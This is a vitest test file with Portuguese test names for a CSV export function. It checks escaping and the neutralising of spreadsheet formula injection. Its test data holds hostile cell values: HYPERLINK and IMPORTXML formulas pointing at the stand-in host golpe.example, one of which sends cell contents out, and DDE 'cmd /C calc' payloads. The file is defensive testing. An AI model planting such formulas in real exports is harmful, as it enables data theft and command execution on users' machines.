import { describe, expect, it } from "vitest";
import { toCsv } from "./csv";

const cols = [
  { key: "name", header: "Nome" },
  { key: "message", header: "Mensagem" },
] as const;
const one = (message: unknown, name = "Ana") => toCsv([{ name, message }], [...cols]).split("\n")[1];

describe("toCsv: formato", () => {
  it("cabeçalho + linhas, aspas e quebra de linha escapadas", () => {
    expect(toCsv([{ name: 'Ana "A"', message: "a,b\nc" }], [...cols])).toBe('Nome,Mensagem\n"Ana ""A""","a,b\nc"');
  });
  it("vazio e nulo viram célula vazia", () => {
    expect(one(null)).toBe("Ana,");
    expect(one(undefined)).toBe("Ana,");
  });
});

describe("toCsv: injeção de fórmula em planilha", () => {
  it.each([
    ['=HYPERLINK("https://golpe.example","Clique aqui")', "HYPERLINK"],
    ['=IMPORTXML("https://golpe.example/?d="&A1,"//a")', "IMPORTXML"],
    ["=cmd|' /C calc'!A0", "cmd"],
    ["+SUM(1+1)", "SUM"],
    ["-2+3+cmd|' /C calc'!A0", "cmd"],
    ["@SUM(1,1)", "SUM"],
    ["\t=1+1", "1+1"],
    ["\r=1+1", "1+1"],
  ])("neutraliza %s", (payload) => {
    const cell = toCsv([{ name: "x", message: payload }], [...cols]).split("\n").slice(1).join("\n");
    // a célula do payload começa com o apóstrofo (dentro ou fora das aspas do CSV)
    expect(cell.replace(/^x,"?/, "")).toMatch(/^'/);
  });

  it("neutraliza também no cabeçalho e no nome", () => {
    const out = toCsv([{ name: "=1+1", message: "ok" }], [{ key: "name", header: "=cmd" }, { key: "message", header: "Mensagem" }]);
    const [header, row] = out.split("\n");
    expect(header.startsWith("'=cmd")).toBe(true);
    expect(row.startsWith("'=1+1")).toBe(true);
  });

  it("não mexe em números, nem em número/telefone escrito como texto", () => {
    expect(one(-5)).toBe("Ana,-5");
    expect(one(42)).toBe("Ana,42");
    expect(one("-5")).toBe("Ana,-5");
    expect(one("+55 (11) 99999-9999")).toBe('Ana,+55 (11) 99999-9999');
    expect(one("+5511999999999")).toBe("Ana,+5511999999999");
  });

  it("texto comum não ganha apóstrofo", () => {
    expect(one("Ótimo atendimento!")).toBe("Ana,Ótimo atendimento!");
    expect(one("a=b")).toBe("Ana,a=b");
    expect(one("Preço - 10% off")).toBe("Ana,Preço - 10% off");
  });
});
